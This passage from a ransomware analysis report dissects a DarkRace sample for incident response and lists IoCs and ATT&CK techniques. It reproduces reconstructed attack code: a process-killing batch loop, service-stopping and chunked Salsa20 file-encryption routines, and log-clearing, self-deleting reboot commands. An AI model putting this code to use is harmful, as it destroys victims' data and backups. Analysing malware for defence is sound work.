4. **Trap** : “stripping” the overlay to “clean” a PE breaks the ransomware (exit), but an attacker build can simply ship a re-stitched PE.
5. **RSA-2048** : still solid in practice against factorization ; the operational weak link remains the private key on the operator side / leaks, not the overlay format.

---

#### 2.5.6 — Summary

```
argv[0] = PE path
        │
        ▼
CreateFileA (+ optionally WNetAddConnection2A)
        │
        ▼
Buffer = entire file in RAM
        │
        ▼
offset = end(.reloc) = 0x3B600
        │
        ▼
┌─────────────────────────────────────┐
│ n  (512 hex) │ e 010001 │ 3fe57B660 │  → 527 bytes
└─────────────────────────────────────┘
        │                │
        ▼                ▼
   RSA public         global extension
        │
        ▼
   RSA_encrypt(Block) → file footers
```

---

## 3. Icon Association (`sub_4033F0`) — Detailed Process

Called at the end of `sub_4030D0`, **after** fixing `lpWideCharStr` (extension). Explains the “weird” desktop icons on Any.RUN **screen_05**.

### 3.1 Goal

1. Give a **unique icon** to all `*.3fe57B660` (psychological pressure / branding).
2. Force Explorer to refresh associations (`SHChangeNotify`).
3. Persist the icon outside encrypted folders : `C:\ProgramData\icon.ico` (ProgramData is also in `white_folders` → not re-encrypted).

### 3.2 Icon Drop

```c
f = fopen("C:\\ProgramData\\icon.ico", "wb");
b64 = config["ico"];                    // ~20 KB base64 in the XML
decoded = base64_decode(b64);           // sub_408A50 (decode)
fwrite(decoded, ..., f);
fclose(f);
```

Source : `<ico>` tag of the XOR config (see `darkrace_config_decrypted.xml`). Multi-resolution ICO format (32×32, 16×16, etc.).

### 3.3 Registry Keys Created (Extension = `3fe57B660`)

```c
sprintf(SubKey, ".%ls", lpWideCharStr);     // ".3fe57B660"
sprintf(ProgId, "%lsfile", lpWideCharStr);  // "3fe57B660file"

// 1) Link extension to ProgID
RegCreateKeyExA(HKCR, ".3fe57B660", ..., KEY_ALL_ACCESS=0xF003F, ...);
RegSetValueExA(hKey, NULL, REG_SZ, "3fe57B660file");

// 2) Default icon of ProgID (Conti pattern : ProgID\DefaultIcon)
RegCreateKeyExA(HKCR, "3fe57B660file\\DefaultIcon" /* or equivalent */, ...);
RegSetValueExA(hKey, NULL, REG_SZ, "C:\\ProgramData\\icon.ico");

SHChangeNotify(SHCNE_ASSOCCHANGED=0x8000000, 0, 0, 0);
```

| Key / Value | Effect |
|-------------|--------|
| `HKCR\.3fe57B660` = `3fe57B660file` | Explorer treats the ext as a custom type |
| `HKCR\3fe57B660file\DefaultIcon` → `icon.ico` | Icon shown for **all** encrypted files |
| `SHCNE_ASSOCCHANGED` | Immediate shell refresh (no need to re-login) |

### 3.4 What This Causes

| Observed | Cause |
|----------|--------|
| screen_05 : pink / non-standard icons on `*.3fe57B660` | HKCR assoc + `icon.ico` |
| Files “unknown type” / custom ProgID | Original Word/PDF association gone (ext changed) |
| Disk artifact `C:\ProgramData\icon.ico` | IoC + proof of run |
| HKCR registry artifacts | Survive reboot (until IR cleanup) |

**No** malware persistence via Run key here : cosmetic / ransomware UX only.

---

## 4. Killer Thread — `1.bat` (`StartAddress`) — Detailed Process

Launched from `sub_401F80` via `CreateThread(..., StartAddress, ...)`.

> Note : config tags `<kill_processes>` / `<kill_services>` exist in the XML but are **referenced nowhere** in the decompiled code of this build. The killer and service stop are therefore driven by the presence of lists / matches, not by those booleans.

### 4.1 Script Generation

```c
f = fopen("C:\\ProgramData\\1.bat", "wb");
fwrite(":start\r\n");
fwrite("ping 127.0.0.1 -n 2 >nul ");
for (proc in split(config["kill_keep"], ';')) {
  fwrite("& taskkill /f /im ");
  fwrite(proc);
  fwrite("* ");                 // suffix wildcard
}
fwrite("\r\ngoto start");
fclose(f);
Sleep(1000);
WinExec("cmd /c C:\\ProgramData\\1.bat", SW_HIDE);
```

### 4.2 Full Generated Script (This Sample)

File also at root : `1.bat`

```bat
:start
ping 127.0.0.1 -n 2 >nul & taskkill /f /im sql* & taskkill /f /im oracle* & taskkill /f /im mysq* & taskkill /f /im chrome* & taskkill /f /im veeam* & taskkill /f /im firefox* & taskkill /f /im excel* & taskkill /f /im msaccess* & taskkill /f /im onenote* & taskkill /f /im outlook* & taskkill /f /im powerpnt* & taskkill /f /im winword* & taskkill /f /im wuauclt* 
goto start
```

### 4.3 Targets (`kill_keep`) and Intent

| Prefix | Typical Targets | Why Kill Them |
|--------|-----------------|---------------|
| `sql*` / `oracle*` / `mysq*` | DB engines | Free locked `.mdf`/`.ldf` / datafiles |
| `veeam*` | Backup | Prevent backup / VSS during the attack |
| `chrome*` / `firefox*` | Browsers | Open profiles / files |
| `excel*` / `winword*` / `powerpnt*` / `onenote*` / `outlook*` / `msaccess*` | Office | Locked documents (handles) |
| `wuauclt*` | Windows Update | Reduce activity / system locks |

`/f` = force ; `*` = any process whose image **starts** with the prefix (`outlook.exe`, `OUTLOOK.EXE`, etc. per `taskkill` rules).

### 4.4 Loop and Timing

- `ping 127.0.0.1 -n 2` ≈ **1 s** pause between each round (not a real network check).
- `goto start` → **infinite** loop until final cleanup (`del 1.bat` + kill `cmd.exe` in §9).
- Runs **in parallel** with walk/encrypt.

### 4.5 Complement : Restart Manager

Even with `taskkill`, some files remain locked. `sub_4039D0` uses **`RmStartSession` / `RmRegisterResources` / `RmGetList`** to identify (and help free) processes holding the file before map/write — classic Conti duo : mass kill + targeted RM.

### 4.6 Any.RUN / Effects

- Signatures : *Executing commands from a .bat file*, *Uses TASKKILL.EXE to kill Office/Browsers*, *Runs PING.EXE to delay*.
- Observed PIDs : `taskkill /f /im outlook*`, `winword*`, `oracle*`, `powerpnt*`, `firefox*`, `msaccess*`, + `ping`.
- Victim effect : Office/DB/browsers crash in a loop during encryption ; unsaved documents lost **even before** the XOR.

---

## 5. Service Stop (`sub_4022E0` + `sub_403710`) — Detailed Process

### 5.1 Config Patterns `<services>`

```
vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr
```

| Pattern | Typical Target | Goal |
|---------|----------------|------|
| `vss` | Volume Shadow Copy | Reinforce anti-recovery (after wmic/vssadmin) |
| `sql` / `svc$` | SQL Server / instances | Free databases |
| `memtas` / `mepocs` | MePocs / related backup | Cut backups |
| `msexchange` | Exchange | Mail stores |
| `sophos` | Sophos AV | Reduce resistance / scans |
| `veeam` / `backup` | Veeam & generic backup | Cut backup jobs |
| `GxVss` `GxBlr` `GxFWD` `GxCVD` `GxCIMgr` | **Backup Exec / GalaxY (Veritas)** agent | Cut enterprise backup stack |

Matching = `strstr(ServiceName, pattern)` → substring, not exact equality (e.g. `sql` matches `MSSQLSERVER`, `SQLWriter`, …).

### 5.2 Phase A — `sub_4022E0` : Resolve Real Service Names

```c
OpenSCManagerA(..., SC_MANAGER_ALL_ACCESS /* or reduced-rights fallback */);
EnumServicesStatusExA(..., SERVICE_WIN32, SERVICE_STATE_ALL, ...);
// for each enumerated service :
//   if strstr(name, pattern) for a pattern in the list → keep the name
// returns "ServiceA;ServiceB;..." (real SCM names)
```

Produces a **concrete** list of services present on **this** machine that match the patterns. If no match → NULL pointer → no stop thread.

### 5.3 Phase B — `sub_403710` : Loop Stop Thread

```c
CreateThread(..., sub_403710, matched_service_list, ...);

while (1) {   // __noreturn — infinite loop
  OpenSCManagerA(...);
  for each service_name in list {
    OpenServiceA(..., SERVICE_STOP | QUERY | ENUMERATE_DEPENDENTS);
    if (state != STOPPED && state != STOP_PENDING) {
      // 1) stop dependents (EnumDependentServicesA)
      // 2) ControlService(SERVICE_CONTROL_STOP)
      // 3) poll QueryServiceStatusEx until STOPPED or timeout ~30s (0x7530 ms)
    }
  }
}
```

| Behavior | Detail |
|----------|--------|
| Dependents first | Avoids “service cannot be stopped” failure |
| Timeout ~30 s | `GetTickCount` + `Sleep(dwWaitHint)` |
| Infinite loop | Like `1.bat` : if a service restarts, it is re-stopped |
| Rights | Need admin for most stops |

### 5.4 What This Causes

- VSS / SQL / Veeam / Sophos / Backup Exec **down** during the run.
- Fewer locks on databases and datastores → more encryptable files.
- System Event Log noise (service entered stopped state) — SOC IoC.
- Coupled with VSS `<cmd>` (§2.3) : double recovery attack (delete shadows **and** stop VSS service).

---

## 6. Multi-thread Orchestration (`sub_401F80`) — Detailed Process

Core of Conti parallelism, called if `local_disks=true` (via `sub_403340`).

### 6.1 Parameters (This Sample)

| Config | Value | Role |
|--------|-------|------|
| `walk_thread` | **15** | Threads that walk the tree / feed the queue |
| `encryption_thread` | **30** | Threads that consume the queue and encrypt |
| `local_disks` | true | Enables this path |
| `network_shares` | **false** | No WNet enum in `sub_403340` |

### 6.2 Sequence

```c
// Sync
mutex_queue_A = CreateMutexA(...);
mutex_queue_B = CreateMutexA(...);
semaphore    = CreateSemaphoreA(..., 0, MAXLONG, ...);

n_walk = atoi("15");
n_enc  = atoi("30");

// 1) Killer + services (in parallel with walk)
CreateThread(StartAddress);                 // 1.bat
matched = sub_4022E0(split(services, ';'));
if (matched)
  CreateThread(sub_403710, matched);        // stop services loop

// 2) Seeds : local / mounted network drives
GetLogicalDriveStringsW(...);
for each drive:
  type = GetDriveTypeW(drive);
  if (type == DRIVE_FIXED(3) || DRIVE_REMOTE(4))
    enqueue(drive_root);                    // e.g. "C:", "D:"

// 3) File pipeline
CreateThread(sub_403E30);                   // feeder / discoverer
for (i = 0; i < 15; i++) {
  CreateThread(sub_4041A0);                 // walkers
  Sleep(300);                               // 0x12C — stagger
}
for (j = 0; j < 30; j++) {
  CreateThread(sub_403960);                 // encryptors → sub_4039D0
  Sleep(300);
}

WaitForSingleObject(feeder);
WaitForMultipleObjects(15, walkers, TRUE, INFINITE);
ReleaseSemaphore(semaphore, 30, ...);       // wake / drain encryptors
WaitForMultipleObjects(30, encryptors, TRUE, INFINITE);
```

### 6.3 Thread Roles

| Thread | Function | Does |
|--------|----------|------|
| `StartAddress` | Killer | Generates/runs `1.bat` |
| `sub_403710` | Service stopper | Loop-stop matched services |
| `sub_403E30` | Feeder | Orchestrates / waits for discovery end |
| `sub_4041A0` ×15 | Walkers | `FindFirstFileW` / `FindNextFileW`, apply whitelists, enqueue paths |
| `sub_403960` ×30 | Encryptors | Dequeue → `sub_4039D0` (RM + Salsa20 + footer + rename) |

Mutexes protect the linked path lists ; the semaphore synchronizes end of encrypt phase.

### 6.4 Drives Taken into Account

- **Included :** `DRIVE_FIXED` (local HDD/SSD), `DRIVE_REMOTE` (already mounted letters like `Z:`).
- **Excluded here :** CDROM, RAM disk, etc.
- **Unmounted shares :** `WNetEnumResourceW` / `WNetAddConnection2W` code present in `sub_403340`, but **disabled** because `network_shares=false`.

### 6.5 Effects

- Strong I/O CPU parallelization → fast encryption on multi-core (Any.RUN : many Desktop/Documents files in little time).
- Up to ~15+30+2 worker threads + child `cmd`/`taskkill` processes.
- `Sleep(300)` stagger : avoids an instantaneous `CreateThread` spike (light anti-burst).

---

## 7. Whitelists During the Walk — Detailed Process

During `FindFirstFileW`, each entry is filtered. Typical comparison : name/path lowercased (`_strlwr`) then `strstr` against each `;`-separated token.

Conti return convention : `1` = **continue / eligible**, `0` = **skip**.

### 7.1 Logical Filter Order

```
FindFirst/Next entry
    │
    ├─ directory ? → white_folders (sub_401C30 / walk) ─ match → DO NOT descend
    │
    ├─ file = Readme.<ext>.txt ? → skip (do not re-encrypt the note)
    │
    ├─ white_files ─ match → skip
    │
    ├─ extension == ransomware ext ? → skip (already encrypted)
    │
    ├─ white_extens ─ match → skip
    │
    └─ else → enqueue for encryption
         (black_db ldf/mdf : flag / SQL priority ; SQL Server paths also forced via sub_4016E0)
```

### 7.2 `white_folders` — 21 Folders (Do Not Traverse)

Comparison on the folder **name** (often via `strstr` on the lowercased path) :

1. `$recycle.bin`  
2. `config.msi`  
3. `$windows.~bt`  
4. `$windows.~ws`  
5. `windows`  
6. `boot`  
7. `program files`  
8. `program files (x86)`  
9. `programdata`  
10. `system volume information`  
11. `tor browser`  
12. `windows.old`  
13. `intel`  
14. `msocache`  
15. `perflogs`  
16. `x64dbg`  
17. `public`  
18. `all users`  
19. `default`  
20. `microsoft`  
21. `appdata`

**Why :** avoid breaking the OS (boot loop), keep ProgramData (icon.ico, 1.bat), avoid Tor Browser (payment channel), reduce AV noise on system binaries.  
**Collateral effect :** data in `AppData` / some profiles may be **spared** if the filter matches too broadly (`microsoft`, `appdata`, `public`…).

### 7.3 `white_files` — 14 Excluded Names

1. `bootmgr`  
2. `autorun.inf`  
3. `boot.ini`  
4. `bootfont.bin`  
5. `bootsect.bak`  
6. `desktop.ini`  
7. `iconcache.db`  
8. `ntldr`  
9. `ntuser.dat`  
10. `ntuser.dat.log`  
11. `ntuser.ini`  
12. `thumbs.db`  
13. `GDIPFONTCACHEV1.DAT`  
14. `d3d9caps.dat`

**Why :** system / profile / UI cache files ; encrypting `ntuser.dat` breaks the user session.

### 7.4 `white_extens` — 50 Excluded Extensions

`386` `adv` `ani` `bat` `bin` `cab` `cmd` `com` `cpl` `cur` `deskthemepack` `diagcab` `diagcfg` `diagpkg` `dll` `drv` `exe` `hlp` `icl` `icns` `ico` `ics` `idx` `lnk` `mod` `mpa` `msc` `msp` `msstyles` `msu` `nls` `nomedia` `ocx` `prf` `ps1` `rom` `rtp` `scr` `shs` `spl` `sys` `theme` `themepack` `wpx` `lock` `key` `hta` `msi` `pdb` `search-ms`

**Why :** mostly binaries / scripts / themes / installers — keep enough system to display the note, open a browser/Tor, leave the machine bootable.  
**IR consequence :** `.exe`/`.dll` not encrypted → possible partial recovery of local tools, but documents (office, images, db) are the target.

### 7.5 `black_db` — Not a Whitelist

```
ldf;mdf
```

SQL database extensions : dedicated marking / handling (Conti also pushes explicitly) :

```c
// sub_4016E0 — adds to the queue for each FIXED drive :
"X:\\Program Files\\Microsoft SQL Server"
"X:\\Program Files (x86)\\Microsoft SQL Server"
```

→ SQL datafiles are **prioritized / forced**, not excluded.

### 7.6 Other Implicit Skips

- Files already in `.3fe57B660` (run extension).
- `Readme.3fe57B660.txt` (avoids looping on the note).
- System attributes sometimes filtered (`dwFileAttributes & 4` system — depending on walk branch).

### 7.7 Effects Summary

| List | Action | Practical Effect |
|------|--------|------------------|
| `white_folders` | Do not descend | OS / ProgramData / Tor preserved |
| `white_files` | Do not encrypt | Boot + basic profile OK |
| `white_extens` | Do not encrypt | Binaries/scripts intact |
| `black_db` + SQL paths | Target | SQL databases attacked first |

---

## 8. File Encryption — Salsa20 + RSA Footer

Two nearly identical implementations on the crypto logic side :

| Function | I/O | Particularity |
|----------|-----|---------------|
| `sub_4026C0` | `ReadFile` / `WriteFile` + `SetFilePointer` | “Simple” path |
| `sub_4039D0` | `CreateFileMapping` / `MapViewOfFile` | + **Restart Manager** if the file is locked |

Encryptors (`sub_403960`) mostly call `sub_4039D0`. Both apply the **same** chunk policy and the same `sub_4045F0` (Salsa20).

Globals used (fixed in §2.4) :

| Global | Role Here |
|--------|-----------|
| `Block` | 16-byte session key → Salsa20 input |
| `lpBuffer` (global) | 512-byte RSA footer appended at EOF |
| `lpWideCharStr` | Extension `3fe57B660` for rename + note |

---

### 8.1 Chunk Policy (Conti Intermittent Encryption)

Goal : **not** XOR an entire multi-GB file (too slow / too much I/O), while still making the file unusable. Encrypt `N` **1 MiB** windows spaced across the size.

```c
// sub_4026C0 / sub_4039D0 — chunk count calculation (v26 / v45)
//
// size = file size in bytes
// chunk_len = size of a window to XOR (often 1 MiB)
// N        = number of windows

uint64_t size = file_size;
int      N    = 1;           // default : 1 pass
size_t   chunk_len;

if (size <= 0x100000) {                 // <= 1 MiB
    // Small file : encrypt EVERYTHING (no intermittence)
    chunk_len = (size_t)size;           // length = exact size
    N = 1;
}
else {
    // Files > 1 MiB : fixed 1 MiB windows
    chunk_len = 0x100000;               // 1 048 576 bytes = 1 MiB

    if (size <= 0xA00000) {             // <= 10 MiB
        N = 1;                          // a single MiB "at the start of the grid"
                                        // (offset 0 * size/1 = 0)
    }
    else if (size <= 0x6400000) {       // <= 100 MiB (0x64 = 100, <<20)
        N = 5;                          // 5 MiB encrypted, spread across the file
    }
    else {
        // > 100 MiB (and also if size high != 0, very large files)
        N = 100;                        // 100 MiB encrypted max (spaced)
    }
}

// Concrete examples :
//   500 KiB  → N=1, chunk=500KiB    → 100% encrypted
//   3 MiB    → N=1, chunk=1MiB      → ~33% (1st MiB of the grid)
//   50 MiB   → N=5, chunk=1MiB      → 5 MiB / 50 MiB = 10%
//   1 GiB    → N=100, chunk=1MiB    → 100 MiB / 1 GiB ≈ 10%
```

**Chunk write loop** (commented version, shared logic) :

```c
// step = distance between two chunk offsets
// For N=5 and size=50MiB : step = 50MiB/5 = 10MiB
//   i=0 → offset 0
//   i=1 → offset 10MiB
//   i=2 → offset 20MiB
//   ...
uint64_t step = size / N;

for (int i = 0; i < N; i++) {
    uint64_t offset = i * step;         // position of the i-th window

    // --- ReadFile path (sub_4026C0) ---
    SetFilePointer(h, offset, ...);
    ReadFile(h, buf, chunk_len, ...);   // reads chunk_len bytes (or less at EOF)

    // In-place XOR with Salsa20 (key = Block, counter tied to position)
    sub_4045F0(
        Block,   // a1 : 16-byte session key
        1,       // a2 : encrypt mode (selects sub_404700 = Salsa20 32-byte key setup)
        &nonce,  // a3 : 64-bit state/counter (evolves with the stream)
        0,       // a4 : start offset in the keystream for THIS buffer
        buf,     // a5 : data pointer
        chunk_len// a6 : number of bytes to XOR
    );

    SetFilePointer(h, offset, ...);     // return to the same offset
    WriteFile(h, buf, chunk_len, ...);  // overwrite the encrypted chunk

    // --- MapView path (sub_4039D0) : same XOR, but ---
    // MapViewOfFile(..., granularity_aligned_offset, chunk_len);
    // sub_4045F0(Block, 1, &nonce, 0, mapped_view, chunk_len);
    // UnmapViewOfFile(...);  // write-back done by the mapper (PAGE_READWRITE)
}
```

**Why `offset = i * (size / N)` ?**

- Spreads damage across the whole file (not only the start).
- A ZIP/VMDK/DB partially XORed at irregular offsets often becomes **unrecoverable** without the key, even if 90% of bytes are still “plaintext” statistically.
- Conti perf gain : cap at **100 MiB** XOR max per huge file.

In-memory file layout after :

```
| chunk0 XOR | ...plain... | chunk1 XOR | ...plain... | ... | chunkN-1 XOR | ... | FOOTER 512 |
^ offset 0                 ^ size/N              ^ (N-1)*size/N           ^ size
                                                                              |
                                                                    lpBuffer (RSA)
```

---

### 8.2 RSA Footer (End of File)

After the chunks :

```c
// sub_4026C0 — classic append
SetFilePointerEx(h, size, NULL, FILE_BEGIN);  // place at the OLD end
WriteFile(h, ::lpBuffer, 0x200, ...);         // writes EXACTLY 512 bytes
                                              // = RSA_encrypt(Block) computed in §2.4
CloseHandle(h);

// sub_4039D0 — via mapping : first enlarges the mapping to size+512
CreateFileMappingA(h, ..., PAGE_READWRITE,
                   high(size+512), low(size+512), NULL);
// then MapView at offset `size` (granularity-aligned) and :
memcpy(view + (size % granularity_adjust), lpBuffer, 0x200);
```

```c
// What the footer contains (reminder) :
//   lpBuffer[0 .. 511] = RSA_pub(session_key Block)
//   → only the attacker PRIVATE key can recover Block
//   → without Block, impossible to rebuild the Salsa20 keystream of the chunks
```

Final size ≈ `size + 512` (rename already happened, see 8.4).

---

### 8.3 Salsa20 Primitive (`sub_4045F0` / `sub_404700` / `sub_404850`)

Conti/DarkRace : **Salsa20** in stream mode, byte-by-byte XOR.

#### 64-byte State Setup

```c
// sub_404850 (effective 32-byte key via "expand 32-byte k")
// Conti duplicates/arranges the 16-byte Block key in the Salsa20 layout.

DWORD state[16];

// Salsa20 sigma constant for 256-bit key (here Conti 32-byte labeling) :
memcpy(state_words_for_constant, "expand 32-byte k", 16);
//   → 4 little-endian words : "expa" | "nd 3" | "2-by" | "te k"

// Classic Salsa20 layout (simplified) :
//   state[0,5,10,15]  = constants "expand 32-byte k"
//   state[1..4]       = key[0..15]   (first half)
//   state[11..14]     = key[16..31]  (second half / Conti-derived)
//   state[6..7]       = nonce / counter (passed via a3 / v15)
//   state[8..9]       = block counter (position in the file)

// sub_404700 : "expand 16-byte k" (tau) variant if other mode ;
// here a2==1 in sub_4045F0 selects the main encrypt path (32-byte).
```

#### Buffer XOR

```c
// sub_4045F0(Block, mode=1, &counter, pos0, data, len)
//
// For each byte data[i] :
//   - every 64 bytes (pos & 0x3F == 0), regenerate a keystream block :
//       counter_block = f(file_position);
//       salsa20_hash(state, keystream[64]);
//   - data[i] ^= keystream[i % 64];
//
// This is stream cipher : encrypt == decrypt == XOR.
// Replaying the SAME keystream (same Block + same offsets) restores plaintext.

uint8_t keystream[64];
unsigned pos = pos0;                 // often 0 at start of a mapped chunk

for (unsigned n = len; n > 0; --n, ++pos) {
    if ((pos & 0x3F) == 0) {         // new 64-byte Salsa20 block
        // The 4 "counter" bytes are derived from pos :
        //   ctr0 = pos >> 6;   ctr1 = pos >> 14;  ...
        // → keystream depends on ABSOLUTE POSITION in the stream
        salsa20_block(Block, &counter_state, keystream);
    }
    data[pos - pos0] ^= keystream[pos & 0x3F];
}
```

**Important IR Points :**

1. Same `Block` for **all** files of the run → one decrypted footer (with the private key) decrypts **the whole** machine.
2. Keystream depends on position : must XOR at the **same offsets** `i * size/N` with the same chunk policy.
3. Remaining “plaintext” zones are generally not enough to rebuild a coherent Office/DB document.

---

### 8.4 Rename + File Open (Before XOR)

Conti order : **rename first**, then encrypt the file already as `.3fe57B660`.

```c
// Builds new_path = old_path + "." + extension
// Ex.  C:\Users\admin\Desktop\report.docx
//   →  C:\Users\admin\Desktop\report.docx.3fe57B660

new_path = concat(old_path, L".", lpWideCharStr);

SetFileAttributesW(old_path, FILE_ATTRIBUTE_NORMAL);  // 0x80
// Removes ReadOnly/Hidden/System that would block MoveFile / Write

MoveFileExW(
    old_path,
    new_path,
    MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH  /* flags 9u */
);
// If rename fails → no encryption of THIS file (return)

h = CreateFileW(
    new_path,
    GENERIC_READ | GENERIC_WRITE,   // 0xC0000000
    0,                              // share mode 0 = exclusive
    NULL,
    OPEN_EXISTING,                  // 3
    FILE_ATTRIBUTE_NORMAL,
    NULL
);
```

#### If `CreateFileW` Fails : Restart Manager (`sub_4039D0`)

```c
// File still locked (Word, SQL, …) despite taskkill
do {
    RmStartSession(&session, 0, sessionKey);     // start an RM session
    RmRegisterResources(session, 1, &path, ...); // "who uses this file?"
    RmGetList(session, ..., &apps, ...);         // process list

    for (each app in apps) {
        // ignore some status (4, 1000) + ignore self
        if (pid != GetCurrentProcessId()) {
            hProc = OpenProcess(PROCESS_TERMINATE | SYNC, FALSE, pid);
            TerminateProcess(hProc, 0);          // targeted kill of the locker
            WaitForSingleObject(hProc, 5000);    // max 5 s
            CloseHandle(hProc);
        }
    }
    RmEndSession(session);

    h = CreateFileW(new_path, GENERIC_READ|GENERIC_WRITE, ...);
} while (h == INVALID_HANDLE_VALUE);
// Then mapping + XOR as above
```

**Effect :** even if `1.bat` missed a process, RM identifies the exact handle holder and kills it.

---

### 8.5 Ransom Note (`sub_4012D0`)

Called **after** each successfully encrypted file (original path / parent directory).

```c
void sub_4012D0(original_path) {
    // Note name = "Readme." + extension + ".txt"
    sprintf(note_name, "Readme.%ls.txt", lpWideCharStr);
    // → "Readme.3fe57B660.txt"

    // Place the note IN THE SAME FOLDER as the file
    // (replace filename with note_name after the last '\')
    note_path = directory_of(original_path) + "\\" + note_name;

    if (_waccess(note_path, 0) != 0) {   // does not exist yet?
        // CreateFile CREATE_NEW — one note per folder only
        h = CreateFileW(note_path, GENERIC_WRITE, ..., CREATE_NEW, ...);
        content = config["content"];     // DarkRace text from XML (§2.2)
        WriteFile(h, content, strlen(content), ...);
        CloseHandle(h);
    }
    // If note already exists → no-op (avoids N notes for N files)
}
```

Content (excerpt) :

```
~~~ DarkRace ransomware ~~~
>>>> Your data are stolen and encrypted
http://wkrlpub5k52rjigwxfm6m7ogid55kamgc5azxlq7zjgaopv33tgx2sqd.onion
Tox ID: BFB2C156D701B968...8A107EED0B97
Mail: darkrace@onionmail.org
```

Visible on Any.RUN **screen_05** (Notepad + desktop full of `*.3fe57B660`).

---

### 8.6 Full Pipeline (One File)

```c
// Commented overview — what EACH eligible file goes through

// [1] Walker enqueued { path, size }
// [2] Encryptor dequeue

// [3] Chunk policy by size → N, chunk_len
// [4] new = path + ".3fe57B660"
// [5] SetFileAttributes NORMAL + MoveFileEx(path → new)
// [6] CreateFile(new) ; if fail → RestartManager kill holders → retry
// [7] for i in 0..N-1:
//         map/read  at offset i*(size/N), length chunk_len
//         buf[j] ^= salsa20(Block, position)[j]
//         write back
// [8] append / map-write footer lpBuffer (512 bytes RSA)
// [9] CloseHandle
// [10] sub_4012D0(path) → ensure Readme.3fe57B660.txt in the folder
```

### 8.7 IR Summary

| Element | Value / Behavior |
|---------|------------------|
| File algo | Salsa20 (stream XOR), constant `"expand 32-byte k"` |
| Key | `Block` 16 bytes (ASCII), **one per run** |
| Key recovery | 512 B footer = RSA-2048(`Block`) with overlay pubkey |
| Intermittence | 1 / 5 / 100 chunks of 1 MiB by size |
| Extension | `.3fe57B660` (rename **before** encrypt) |
| Note | `Readme.3fe57B660.txt` **once per folder** |
| Anti-lock | Global `taskkill` + Restart Manager per file |

---

## 9. Final Cleanup `sub_402F40` (Observed Reboot)

```c
if (config["delete_eventlogs"] == "true") {
  for (log in {"application","system","security"})
    ClearEventLogA(OpenEventLogA(0, log), 0);
}

WinExec("cmd /c \"taskkill /f /im cmd.exe & taskkill /f /im conhost.exe\"", 0);
Sleep(2000);

if (config["shutdown_system"] == "true")
  cmd = "cmd /c \"ping 127.0.0.1 & del C:\\ProgramData\\1.bat & del %s & shutdown -r -f -t 0\"";
else
  cmd = "cmd /c \"ping 127.0.0.1 & del C:\\ProgramData\\1.bat & del %s\"";
// %s = malware path (self-delete)
WinExec(cmd, 0);
ExitProcess(0);
```

**Any.RUN :**
- signature *Starts CMD.EXE for self-deleting*
- *The system shut down or reboot*
- **screen_15** (kept) : Windows login screen after forced reboot

---

## 10. Sandbox Timeline (Reconstructed)

```
t0     PE launch (PID 7008), console hidden
t0+ε   CheckMutex mutex, XOR config, VSS delete (if admin)
t0+ε   Drop icon.ico + .3fe57B660 assoc
t0+ε   Drop/exec C:\ProgramData\1.bat → taskkill loop + ping
t0+…   Walk Desktop/Documents/… → encrypt + Readme
       (Any.RUN: currencypost.rtf.3fe57B660, Database1.accdb.3fe57B660, …)
t_end  Clear event logs, self-delete, shutdown -r
       → reboot → login screen (screen_15)
```

**Malware network :** no C2. Any.RUN HTTP is Windows noise (Bing, OCSP, WNS, login.live…). Operator contact = TOR/Tox/mail in the note only.

---

## 11. IoCs

```
SHA256  74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3
MD5     cb1c423268b1373bde8a03f36f66b495
Mutex   CheckMutex
Ext     .3fe57B660
Note    Readme.3fe57B660.txt
Paths   C:\ProgramData\1.bat
        C:\ProgramData\icon.ico
Email   darkrace@onionmail.org
Onion   wkrlpub5k52rjigwxfm6m7ogid55kamgc5azxlq7zjgaopv33tgx2sqd.onion
YARA    DONEX (Any.RUN)
```

RSA modulus (start) : `C5A0A7250BB5E100D5B01B4213804705...`

---

## 12. Any.RUN Captures (After Sorting)

Local folder : `anyrun_screenshots/` — **2 JPEG** kept (1360×768).

| # | File | Content | Role in the Report |
|---|------|---------|-------------------|
| 05 | `screen_05_27824fef-7b8a-4606-ba19-3c46db926211.jpg` | Encrypted desktop : many `*.3fe57B660`, custom icons, **Notepad** open on `Readme.3fe57B660.txt` (DarkRace note : onion / Tox / `darkrace@onionmail.org`) | Impact proof + ransom content |
| 15 | `screen_15_77383982-f21f-4f6e-a7c8-720d50fd7f6c.jpg` | **Windows login** screen post-infection | Proof of `shutdown -r` (`shutdown_system=true`) |

```
anyrun_screenshots/
├── screen_05_27824fef-7b8a-4606-ba19-3c46db926211.jpg   ← encryption + note
└── screen_15_77383982-f21f-4f6e-a7c8-720d50fd7f6c.jpg   ← reboot / login
```

Other Any.RUN captures (pre-infection, black screens, WinRE) were discarded during sorting.

---

## 13. ATT&CK (Quick Mapping)

| Technique | ID | Evidence |
|-----------|-----|----------|
| Hide window | T1564.003 | `ShowWindow(SW_HIDE)` |
| Clear Event Logs | T1070.001 | `ClearEventLogA` |
| Inhibit System Recovery | T1490 | `vssadmin` / `wmic shadowcopy` |
| Service Stop | T1489 | stop `vss`, backup, … |
| Data Encrypted for Impact | T1486 | Salsa20 + RSA footer |
| Indicator Removal (self-delete) | T1070 | `del %malware%` |
| System Shutdown/Reboot | T1529 | `shutdown -r -f -t 0` |

---

## 14. Files Produced in This Folder

```
anyrun_screenshots/
  screen_05_27824fef-7b8a-4606-ba19-3c46db926211.jpg
  screen_15_77383982-f21f-4f6e-a7c8-720d50fd7f6c.jpg
1.bat                                  ← reconstructed (C:\ProgramData\1.bat)
darkrace_config_decrypted.xml          ← full XML config
darkrace_config_readable.xml           ← same, <ico> truncated
extract_config.py                      ← XOR 0xA9 re-extraction
overlay_rsa_pubkey.bin                 ← PE overlay 527 B (n|e|ext)
overlay_rsa_n.hex                      ← RSA-2048 modulus (hex)
overlay_extension.txt                  ← 3fe57B660
rsa_public_key.pem                     ← SPKI pubkey (PEM)
rsa_public_key_pkcs1.pem               ← PKCS#1 pubkey (PEM)
rsa_public_key.der                     ← DER pubkey
rsa_public_key.txt                     ← n/e/PEM/ext sheet
README.md                              ← French version of this document
README_EN.md                           ← this document (English)
74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3
74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3.c
```

---

*End of report.*
